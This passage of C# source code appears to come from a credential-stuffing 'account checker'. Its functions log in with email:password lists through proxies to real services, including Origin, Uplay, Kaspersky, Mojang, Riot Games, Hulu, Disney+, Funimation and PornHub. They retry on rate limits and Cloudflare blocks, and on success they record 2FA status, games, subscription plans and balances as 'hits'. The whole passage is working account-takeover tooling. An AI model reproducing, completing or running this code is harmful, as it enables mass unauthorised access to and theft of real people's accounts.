                                Match match10 = Regex.Match(text2, "lastAuthDate\" : \"(.*?)\"");
                                Match match11 = Regex.Match(text2, "emailStatus\" : \"(.*?)\"");
                                string text3 = Convert.ToString(1);
                                flag = text2.Contains("tfaEnabled\" : false");
                                if (flag)
                                {
                                    text3 = "False";
                                }
                                else
                                {
                                    text3 = "True";
                                }
                                req.AddHeader("User-Agent", "Mozilla/5.0 EA Download Manager Origin/10.5.37.24524");
                                req.AddHeader("Accept", "application/vnd.origin.v2+json");
                                req.AddHeader("Cache-Control", "no-cache");
                                req.AddHeader("AuthToken", match3.Groups[1].Value);
                                req.AddHeader("X-Origin-UID", "17524622993368447356");
                                req.AddHeader("X-Origin-Platform", "PCWIN");
                                req.AddHeader("localeInfo", "en_US");
                                req.AddHeader("Accept-Language", "en-US");
                                req.AddHeader("Connection", "Keep-Alive");
                                req.AddHeader("Accept-Encoding", "gzip, deflate");
                                req.AddHeader("Host", "api1.origin.com");
                                string input3 = req.Get("https://api1.origin.com/ecommerce2/basegames/" + match7.Groups[1].Value + "?machine_hash=17524622993368447356", null).ToString();
                                MatchCollection matchCollection = Regex.Matches(input3, "\"offerPath\" : \"\\/(.*?)\"");

                                int num = 0;
                                int num2 = matchCollection.Count - 1;
                                int num3 = num;
                                for (; ; )
                                {
                                    int num4 = num3;
                                    int num5 = num2;
                                    if (num4 > num5)
                                    {
                                        break;
                                    }
                                    num3++;
                                }
                                return "Email status: " + match11.Groups[1].Value + " | Country: " + match5.Groups[1].Value + " | 2FA: " + text3 + " | Games: " + Convert.ToString(matchCollection.Count);

                            }
                            catch
                            {
                                return "Capture error!";

                            }
                        }
                        else
                        {

                            flag = text.Contains("We're sorry, but we're having some technical difficulties");

                            if (flag)
                            {
                                //
                            }
                            else
                            {
                                flag = text.Contains("Two Factor Log In");
                                if (flag)
                                {
                                    return "2FA";
                                }
                                else
                                {
                                    flag = text.Contains("Your credentials are incorrect or have expired");
                                    if (flag)
                                    {
                                        return "Bad";
                                    }
                                    else
                                    {
                                        //
                                    }
                                }





                            }
                        }
                    }
                }


                catch (Exception)
                {
                    //
                }

            }

        }
        #endregion


        #region Uplay
        static string Uplay(string email, string password)
        {

            while (true)
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        //req.AddHeader("Referer", "https://connect.ubisoft.com/login?appId=e06033f4-28a4-43fb-8313-6c2d882bc4a6&lang=en-GB&nextUrl=https:%2F%2Foverlay.ubisoft.com%2Foverlay-connect-integration%2Flogged-in.html&genomeId=031c6c79-623d-4831-9c01-0f01d1f77c88");
                        req.AddHeader("Content-Type", "application/json");
                        req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
                        req.Authorization = "Basic " + Utils.Base64Encode(email + ":" + password);

                        string strResponse = req.Post(new Uri("https://public-ubiservices.ubi.com/v3/profiles/sessions"), new BytesContent(Encoding.Default.GetBytes("{\"rememberMe\":true}"))).ToString();
                        if (strResponse.Contains("sessionId"))
                        {
                            JObject jsonObj = (JObject)JsonConvert.DeserializeObject(strResponse);

                            string sessionId = jsonObj["sessionId"].ToString();
                            string ticket = jsonObj["ticket"].ToString();

                            string has2fa = UPlayHas2FA(ticket, sessionId);

                            string games = UPlayGetGames(ticket);

                            if (games == "")
                                continue;
                            return "Has 2FA: " + has2fa + " - Games: " + games;
                        }
                        return "Bad";
                    }
                }
                catch
                {
                    Check.errors++;
                }
            }

        }
        static string UPlayHas2FA(string ticket, string sessionId)
        {
            while (true)
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.AddHeader("Ubi-SessionId", sessionId);
                        req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
                        req.Authorization = "Ubi_v1 t=" + ticket;

                        string strResponse = req.Get(new Uri("https://public-ubiservices.ubi.com/v3/profiles/me/2fa")).ToString();
                        if (strResponse.Contains("active"))
                        {
                            if (strResponse.Contains("true"))
                            {
                                return "true";
                            }
                            else if (strResponse.Contains("false"))
                            {
                                return "false";
                            }
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                }
            }
            return "?";
        }
        static string UPlayGetGames(string ticket)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    SetBasicRequestSettingsAndProxies(req);

                    req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
                    req.Authorization = "Ubi_v1 t=" + ticket;

                    string strResponse = req.Get(new Uri("https://public-ubiservices.ubi.com/v1/profiles/me/club/aggregation/website/games/owned")).ToString();
                    if (strResponse.Contains("[") && strResponse != "[]")
                    {
                        Match games = Regex.Match(strResponse, "\"slug\":\"(.*?)\"");
                        Match platforms = Regex.Match(strResponse, "\"platform\":\"(.*?)\"");

                        string result = "";

                        while (true)
                        {
                            result += "[" + games.Groups[1].Value.Replace("-", " ") + " - " + platforms.Groups[1].Value + "]";

                            games = games.NextMatch();
                            platforms = platforms.NextMatch();

                            if (games.Groups[1].Value == "")
                                break;
                            else
                                result += ", ";
                        }

                        return result;
                    }
                }
            }
            catch
            {
                Check.errors++;
            }
            return "";
        }
        #endregion


        #region Kaspersky
        static string Kaspersky(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);


                        HttpResponse res = req.Get(new Uri($"https://my.kaspersky.com"));
                        string res_str = res.ToString();


                        req.AddHeader("Content-Type", "application/json");
                        HttpResponse res1 = req.Post(new Uri($"https://hq.uis.kaspersky.com/v3/logon/start"), new BytesContent(Encoding.Default.GetBytes("{\"Realm\":\"https://center.kaspersky.com/\"}")));
                        string res1_str = res1.ToString();

                        string logonContext = Parse(res1_str, "\"LogonContext\":\"", "\"");
                        string data = "{\"logonContext\":\"" + logonContext + "\",\"login\":\"" + email + "\",\"password\":\"" + password + "\",\"locale\":\"en\",\"captchaType\":\"invisible_recaptcha\",\"captchaAnswer\":\"undefined\"}";
                        req.AddHeader("Content-Type", "application/json");
                        req.AddHeader("Host", "hq.uis.kaspersky.com");

                        HttpResponse res2 = req.Post(new Uri($"https://hq.uis.kaspersky.com/v3/logon/proceed"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string login = res2.ToString();

                        if (login.Contains("Success"))
                        {
                            return "Hit";
                        }
                        else
                        {
                            if (login.Contains("{\"Status\":\"InvalidRegistrationData\"}"))
                            {
                                return "Bad";
                            }
                            else
                            {
                                Check.errors++;
                                continue;
                            }
                        }

                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }
        #endregion

        #region Minecraft
        static Uri mojangAuth = new Uri("https://authserver.mojang.com/authenticate");
        static string minecraft(string email, string password)
        {

            // Ok so the method returns a string that says if it's a hit, what type, and cap. It takes 2 params, email and pass. You don't have to worry about that because it's already done


            // For loop, if it doesn't return a value it is a retrie, that's why we use the loop
            for (; ; )
            {
                using (HttpRequest req = new HttpRequest())
                {
                    List<string> results = new List<string>();
                    string acc = email + ":" + password;

                    // Basic stuff, proxies, etc, you can see what id does above
                    SetBasicRequestSettingsAndProxies(req);
                    req.AddHeader("Content-Type", "application/json");
                    HttpResponse res;
                    try
                    {
                        // We try to do the request, but don't put the raw website/post data, do it as I did it here: 
                        res = req.Post(new Uri($"https://authserver.mojang.com/refresh"), new BytesContent(Encoding.Default.GetBytes("\"{\\\"accessToken\\\":\\\"2545345\\\",\\\"clientToken\\\":\\\"34535343\\\"}\"")));
                    }
                    catch
                    {
                        // If error then we continue in the loop (retrie)
                        Check.errors++;
                        continue;
                    }
                    string login = res.ToString();
                    if (login.Contains("TooManyRequestsException"))
                    {
                        // retrie
                        Check.errors++;
                        continue;
                    }
                    else if (login.Contains("cloudflare"))
                    {
                        // retrie
                        Check.errors++;
                        continue;
                    }
                    else if (login.Contains("Unsupported Media Type"))
                    {
                        // retrie
                        Check.errors++;
                        continue;
                    }
                    else if (login.Contains("ForbiddenOperationException"))
                    {
                        req.AddHeader("Content-Type", "application/json");
                        HttpResponse response = req.Post(mojangAuth, new BytesContent(Encoding.Default.GetBytes("{\"agent\": {\"name\": \"Minecraft\",\"version\": 1},\"username\": \"" + email + "\",\"password\": \"" + password + "\",\"requestUser\": \"true\"}")));

                        string cap = response.ToString();

                        if (cap.Contains("errorMessage"))
                        {
                            req.AddHeader("Content-Type", "application/json");
                            HttpResponse res12;
                            try
                            {
                                // We try to do the request, but don't put the raw website/post data, do it as I did it here: 
                                res12 = req.Post(new Uri($"https://authserver.mojang.com/refresh"), new BytesContent(Encoding.Default.GetBytes("\"{\\\"accessToken\\\":\\\"2545345\\\",\\\"clientToken\\\":\\\"34535343\\\"}\"")));
                            }
                            catch
                            {
                                // If error then we continue in the loop (retrie)
                                Check.errors++;
                                continue;
                            }
                            string Check12 = res12.ToString();
                            if (Check12.Contains("ForbiddenOperationException"))
                            {
                                return "Bad";
                            }
                            else
                            {
                                // If error then we continue in the loop (retrie)
                                Check.errors++;
                                continue;
                            }
                        }
                        else if (cap.Contains("selectedProfile"))
                        {
                            JObject jsonObj = (JObject)JsonConvert.DeserializeObject(cap);

                            string username = (string)jsonObj["selectedProfile"]["name"];
                            /*returned["uuid"] = (string)jsonObj["selectedProfile"]["id"];*/
                            string token = (string)jsonObj["accessToken"];

                            if (cap.Contains("legacy\":true"))
                            {
                                results.Add("Unmigrated");
                            }
                            else
                            {
                                if (SFACheck(token))
                                {
                                    results.Add("SFA");
                                }
                                else
                                {
                                    results.Add("NFA");
                                }
                            }
                            results.Add("Username: " + username);
                            return string.Join(" - ", results);

                        }
                    }
                    else
                    {
                        Check.errors++;
                        continue;
                    }


                }
            }
        }

        static Uri SFACheckUri = new Uri("https://api.mojang.com/user/security/challenges");

        public static bool SFACheck(string token)
        {
            for (int i = 0; i < Config.retries + 1; i++)
            {
                while (true)
                {
                    try
                    {
                        using (HttpRequest req = new HttpRequest())
                        {
                            SetBasicRequestSettingsAndProxies(req);

                            req.AddHeader("Authorization", "Bearer " + token);
                            string response = req.Get(SFACheckUri).ToString();

                            if (response == "[]")
                            {
                                return true;
                            }
                            else
                            {
                                break;
                            }
                        }

                    }
                    catch
                    {
                        Check.errors++;
                    }
                }
            }
            return false;
        }
        #endregion


        #region LoL EUW
        static string LoLEUW(string email, string password)
        {
            for (; ; )
            {

                string user = "";
                int index = email.IndexOf("@");
                if (index > 0)
                    user = email.Substring(0, index);
                else
                {
                    user = email;
                }

                string acc = user + ":" + password;


                using (HttpRequest req = new HttpRequest())
                {
                    try
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36";
                        string str = string.Concat(new string[]
              {
                            "client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username=EUW1|",
                            user,
                            "&password=",
                             password,
                            "&scope=openid offline_access lol ban profile email phone"
              });
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        HttpResponse r = req.Post(new Uri($"https://auth.riotgames.com/token"), new BytesContent(Encoding.Default.GetBytes(str)));
                        string text2 = r.ToString();

                        if (text2.Contains("access_token"))
                        {
                            string str2 = Parse(text2, "access_token\":\"", "\",\"");
                            req.AddHeader("Authorization", "Bearer " + str2);
                            HttpResponse r2;
                            try
                            {
                                r2 = req.Get(new Uri($"https://store.euw1.lol.riotgames.com/storefront/v3/history/purchase?language=de_DE"));
                            }
                            catch
                            {
                                continue;
                            }
                            string text3 = r2.ToString();
                            if (text3.Contains("accountId"))
                            {
                                string text4 = Parse(text3, "summonerLevel\":", "}");
                                string text5 = Parse(text3, "ip\":", ",\"");
                                string text6 = Parse(text3, "rp\":", ",\"");
                                string text7 = Parse(text3, "refundCreditsRemaining\":", ",\"");
                                req.AddHeader("Authorization", "Bearer " + str2);
                                HttpResponse r3 = req.Get(new Uri($"https://email-verification.riotgames.com/api/v1/account/status"));
                                string _ = r3.StatusCode.ToString();
                                string source = r3.ToString();
                                string text8 = Parse(source, "emailVerified\":", "}");
                                req.AddHeader("Authorization", "Bearer " + str2);
                                HttpResponse r4 = req.Get(new Uri($"https://euw1.cap.riotgames.com/lolinventoryservice/v2/inventories?inventoryTypes=CHAMPION&language=en_US"));
                                string source2 = r4.ToString();
                                string text9 = Regex.Matches(Parse(source2, "items\":{\"", "false}]"), "itemId\":").Count.ToString();
                                req.AddHeader("Authorization", "Bearer " + str2);
                                HttpResponse r5 = req.Get(new Uri($"https://euw1.cap.riotgames.com/lolinventoryservice/v2/inventories?inventoryTypes=CHAMPION_SKIN&language=en_US"));
                                string source3 = r5.ToString();
                                string text10 = Regex.Matches(Parse(source3, "items\":{\"", "false}]"), "itemId\":").Count.ToString();
                                return " | Level: " + text4 + " | BE: " + text5 + " | Rp: " + text6 + " | RefundsRemaing: " + text7 + " | EmailVerified: " + text8 + " | Champs " + text9 + " | Skins: " + text10;
                            }
                        }
                        else if (text2.Contains("Your password and email do not match. Please try again or Reset Your Password.") || text2.Contains("user_auth_fail") || text2.Contains("invalid_credentials"))
                        {
                            return "Bad";
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }



                    }
                    catch
                    {
                        continue;
                    }




                }


            }
        }
        #endregion

        #region LoL NA
        static string LoLNA(string email, string password)
        {
            for (; ; )
            {


                string user = "";
                int index = email.IndexOf("@");
                if (index > 0)
                    user = email.Substring(0, index);
                else
                {
                    user = email;
                }

                string acc = user + ":" + password;


                using (HttpRequest req = new HttpRequest())
                {
                    try
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36";

                        string str = string.Concat(new string[]
              {
                            "client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username=NA1|",
                            user,
                            "&password=",
                             password,
                            "&scope=openid offline_access lol ban profile email phone"
              });
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        HttpResponse r1 = req.Post(new Uri($"https://auth.riotgames.com/token"), new BytesContent(Encoding.Default.GetBytes(str)));
                        string text2 = r1.ToString();

                        if (text2.Contains("access_token"))
                        {
                            string str2 = Parse(text2, "access_token\":\"", "\",\"");
                            req.AddHeader("Authorization", "Bearer " + str2);
                            HttpResponse r2 = req.Get(new Uri($"https://store.na2.lol.riotgames.com/storefront/v3/history/purchase?language=en_US"));

                            string text3 = r2.ToString();
                            if (text3.Contains("accountId"))
                            {
                                string text4 = Parse(text3, "summonerLevel\":", "}");
                                string text5 = Parse(text3, "ip\":", ",\"");
                                string text6 = Parse(text3, "rp\":", ",\"");
                                string text7 = Parse(text3, "refundCreditsRemaining\":", ",\"");
                                req.AddHeader("Authorization", "Bearer " + str2);
                                HttpResponse r3 = req.Get(new Uri($"https://email-verification.riotgames.com/api/v1/account/status"));
                                string source = r3.ToString();
                                string text8 = Parse(source, "emailVerified\":", "}");
                                req.AddHeader("Authorization", "Bearer " + str2);
                                HttpResponse r4 = req.Get(new Uri($"https://na1.cap.riotgames.com/lolinventoryservice/v2/inventories?inventoryTypes=CHAMPION&language=en_US"));
                                string source2 = r4.ToString();
                                string text9 = Regex.Matches(Parse(source2, "items\":{\"", "false}]"), "itemId\":").Count.ToString();
                                req.AddHeader("Authorization", "Bearer " + str2);
                                HttpResponse r5 = req.Get(new Uri($"https://na1.cap.riotgames.com/lolinventoryservice/v2/inventories?inventoryTypes=CHAMPION_SKIN&language=en_US"));
                                string source3 = r5.ToString();
                                string text10 = Regex.Matches(Parse(source3, "items\":{\"", "false}]"), "itemId\":").Count.ToString();
                                return " | Level: " + text4 + " | BE: " + text5 + " | Rp: " + text6 + " | RefundsRemaing: " + text7 + " | EmailVerified: " + text8 + " | Champs " + text9 + " | Skins: " + text10;
                            }
                        }
                        else if (text2.Contains("Your password and email do not match. Please try again or Reset Your Password.") || text2.Contains("user_auth_fail") || text2.Contains("invalid_credentials"))
                        {
                            return "Bad";
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }





                    }
                    catch
                    {
                        continue;
                    }

                }

            }
        }
        #endregion

        #region Hulu
        static string Hulu(string email, string password)
        {
            for (; ; )
            {
                using (HttpRequest req = new HttpRequest())
                {
                    try
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.UserAgent = "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        string data = $"affiliate_name=apple&friendly_name=grantt+Iphone&password={password}&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email={email}";
                        HttpResponse r = req.Post(new Uri($"https://auth.hulu.com/v1/device/password/authenticate"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string response_login = r.ToString();
                        if (response_login.Contains("Your login is invalid"))
                        {
                            return "Bad";
                        }
                        else if (response_login.Contains("user_token"))
                        {
                            string token = Parse(response_login, "user_token\":\"", "\"");
                            req.AddHeader("Authorization", "Bearer " + token);
                            HttpResponse r2 = req.Get(new Uri($"https://home.hulu.com/v1/users/self"));
                            string cap = r2.ToString();
                            if (cap.Contains("package_ids\":[],\"") || cap.Contains("\",\"status\":\"5\",\"subscriber_id\":\""))
                            {
                                return "Free";
                            }
                            else if (cap.Contains("\"status\":\"6\",\"subscriber_id\"") || cap.Contains("\"status\":null,\"subscriber_id\""))
                            {
                                return "Bad";
                            }
                            else if (cap.Contains(",\"subscription\":{\"id\":"))
                            {
                                string pkgid = Parse(cap, "\"package_ids\":", ",\"cus");
                                if (pkgid.Contains("[\"1\",\"2\"]"))
                                {
                                    return "Plan: Hulu";
                                }
                                else
                                {
                                    string pkgid2 = Parse(cap, "package_ids\":[\"1\",\"2\",", "],\"c");
                                    if (pkgid2.Contains("\"14\""))
                                    {
                                        return "Plan: Hulu (No Ads)";
                                    }
                                    else if (pkgid2.Contains("\"15\""))
                                    {
                                        return "Plan: SHOWTIME";
                                    }
                                    else if (pkgid2.Contains("\"16\""))
                                    {
                                        return "Plan: Live TV";
                                    }
                                    else if (pkgid2.Contains("\"17\""))
                                    {
                                        return "Plan: HBO";
                                    }
                                    else if (pkgid2.Contains("\"18\""))
                                    {
                                        return "Plan: CineMax";
                                    }
                                    else if (pkgid2.Contains("\"19\""))
                                    {
                                        return "Plan: STARZ";
                                    }
                                    else if (pkgid2.Contains("\"21\""))
                                    {
                                        return "Plan: Entertainment Add-On";
                                    }
                                    else if (pkgid2.Contains("\"23\""))
                                    {
                                        return "Plan: Español Add-On";
                                    }
                                    else if (pkgid2.Contains("\"25\",\"26\""))
                                    {
                                        return "Plan: Hulu, Disney+, and ESPN+";
                                    }
                                    else if (pkgid2.Contains("\"17\",\"27\""))
                                    {
                                        return "Plan: HBO Max";
                                    }
                                    else
                                    {
                                        return "Plan: Unknown";
                                    }
                                }
                            }
                            else
                            {
                                Check.errors++;
                                continue;
                            }
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                    catch
                    {
                        Check.errors++;
                        continue;
                    }
                }
            }
        }
        #endregion

        #region Disney
        static string Disnet(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        string acc = email + ":" + password;
                        string acc_encoded = Utils.Base64Encode(acc);

                        SetBasicRequestSettingsAndProxies(req);

                        string text = disneyfirst();
                        if (!(text == ""))
                        {
                            req.AddHeader("Content-Type", "application/json");
                            req.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                            req.Authorization = "Bearer " + text;

                            string text2 = req.Post(new Uri("https://global.edge.bamgrid.com/idp/login"), new BytesContent(Encoding.Default.GetBytes(string.Concat(new string[]
                            {
                                "{\"email\":\"",
                                email,
                                "\",\"password\":\"",
                                password,
                                "\"}"
                            })))).ToString();

                            if (text2.Contains("id_token"))
                            {
                                JObject jobject = (JObject)JsonConvert.DeserializeObject(text2);
                                string string_ = jobject["id_token"].ToString();
                                string text3 = "";
                                for (int j = 0; j < 1 + 1; j++)
                                {
                                    text3 = smethod_34(text, string_);
                                    if (text3 != "")
                                    {
                                        break;
                                    }
                                }
                                if (text3 == "")
                                {
                                    return "Hit";
                                }
                                if (text3 == "Free" || text3 == "Expired")
                                {
                                    return "Free";
                                }
                                return text3;
                            }
                            else if (text2.Contains("Bad credentials"))
                            {
                                return "Bad";
                            }
                            else
                            {
                                Check.errors++;
                                continue;
                            }

                        }


                    }
                    continue;
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }

        }

        private static string smethod_34(string string_0, string string_1)
        {
            for (int i = 0; i < 10; i++)
            {
                try
                {
                    using (HttpRequest httpRequest = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(httpRequest);
                        httpRequest.AddHeader("Content-Type", "application/json");
                        httpRequest.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                        httpRequest.Authorization = "Bearer " + string_0;
                        string text = httpRequest.Post(new Uri("https://global.edge.bamgrid.com/accounts/grant"), new BytesContent(Encoding.Default.GetBytes("{\"id_token\":\"" + string_1 + "\"}"))).ToString();
                        string text2 = "";
                        if (text.Contains("assertion"))
                        {
                            text2 = Regex.Match(text, "\"assertion\":\"(.*?)\"").Groups[1].Value;
                        }
                        if (text2 == "")
                        {
                            return "";
                        }
                        httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        httpRequest.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                        httpRequest.Authorization = "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84";
                        string text3 = httpRequest.Post(new Uri("https://global.edge.bamgrid.com/token"), new BytesContent(Encoding.Default.GetBytes("grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token=" + text2 + "&subject_token_type=urn:bamtech:params:oauth:token-type:account"))).ToString();
                        if (text3.Contains("access_token"))
                        {
                            text2 = Regex.Match(text3, "\"access_token\":\"(.*?)\"").Groups[1].Value;
                        }
                        if (text2 == "")
                        {
                            return "";
                        }
                        httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        httpRequest.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                        httpRequest.Authorization = "Bearer " + text2;
                        string text4 = httpRequest.Get(new Uri("https://global.edge.bamgrid.com/subscriptions"), null).ToString();
                        if (text4.Contains("[]") && !text4.Contains("name"))
                        {
                            return "Free";
                        }
                        if (text4.Contains("name"))
                        {
                            JObject jobject = (JObject)((JArray)JsonConvert.DeserializeObject(text4))[0];
                            string str = jobject["products"][0]["name"].ToString();
                            DateTime t = (DateTime)jobject["expirationDate"];
                            if (DateTime.Now > t)
                            {
                                return "Expired";
                            }
                            return "Plan: " + str + " | Expiration Date: " + t.ToString("dd/MM/yyyy");
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                }
            }
            return "";
        }


        public static string disneyfirst()
        {
            string result;
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("Content-Type", "application/json");
                        req.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");

                        req.Authorization = "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84";
                        string text = req.Post(new Uri("https://global.edge.bamgrid.com/devices"), new BytesContent(Encoding.Default.GetBytes("{\"deviceFamily\":\"browser\",\"applicationRuntime\":\"chrome\",\"deviceProfile\":\"windows\",\"attributes\":{}}"))).ToString();
                        string text2 = "";
                        if (text.Contains("assertion"))
                        {
                            text2 = Regex.Match(text, "assertion\":\"(.*?)\"").Groups[1].Value;
                        }
                        if (!(text2 == ""))
                        {
                            req.ClearAllHeaders();
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                            req.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                            req.Authorization = "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84";
                            string text3 = req.Post(new Uri("https://global.edge.bamgrid.com/token"), new BytesContent(Encoding.Default.GetBytes("grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token=" + text2 + "&subject_token_type=urn:bamtech:params:oauth:token-type:device"))).ToString();
                            if (text3.Contains("access_token"))
                            {
                                text2 = Regex.Match(text3, "\"access_token\":\"(.*?)\"").Groups[1].Value;
                            }
                            result = text2;
                            break;
                        }
                        result = "";
                        break;
                    }
                }
                catch
                {
                    Check.errors++;
                }
            }
            return result;
        }
        #endregion

        #region Funimation
        static string Funimation(string email, string password)
        {
            for (; ; )
            {
                using (HttpRequest req = new HttpRequest())
                {
                    string acc = email + ":" + password;
                    string acc_encoded = Utils.Base64Encode(acc);

                    SetBasicRequestSettingsAndProxies(req);
                    req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                    req.AddHeader("Accept", "*/*");
                    req.AddHeader("Pragma", "no-cache");
                    req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                    HttpResponse res;
                    try
                    {
                        res = req.Post(new Uri($"https://prod-api-funimationnow.dadcdigital.com/api/auth/login/"), new BytesContent(Encoding.Default.GetBytes("username=" + email + "&password=" + password)));
                    }
                    catch
                    {
                        Check.errors++;
                        continue;
                    }
                    string login = res.ToString();
                    if (login.Contains("Failed Authentication"))
                    {
                        return "Bad";
                    }
                    else if (login.Contains("log in to your account at this time. Please try again later"))
                    {
                        Check.errors++;
                        continue;
                    }
                    else if (login.Contains("{\"token\":\""))
                    {
                        string country = Parse(login, "user_region\":\"", "\"}");
                        string subscription = Parse(login, "en:web:us_", "\",");
                        if (subscription.Contains("free"))
                        {
                            return "Free";

                        }
                        else
                        {
                            return "Country = " + country + " Subscription = " + subscription;
                        }
                    }


                }
            }
        }
        #endregion

        #region PornHub
        static string PornHub(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        string acc = email + ":" + password;

                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                        req.AddHeader("Origin", "https://de.pornhubpremium.com");
                        req.AddHeader("Referer", "https://de.pornhubpremium.com/premium/login");
                        req.AddHeader("Host", "de.pornhubpremium.com");
                        req.AddHeader("Content_Type", "application/x-www-form-urlencoded");
                        HttpResponse res = req.Get(new Uri("https://de.pornhubpremium.com/premium/login"));
                        string res_str = res.ToString();
                        string token = Parse(res_str, "ue=\"", "\" />");

                        req.ClearAllHeaders();
                        string data = $"username={email}&password={password}&token={token}&redirect=&from=pc_premium_login&segment=straigh";
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");
                        req.AddHeader("Host", "de.pornhubpremium.com");
                        req.AddHeader("Origin", "https://de.pornhubpremium.com");
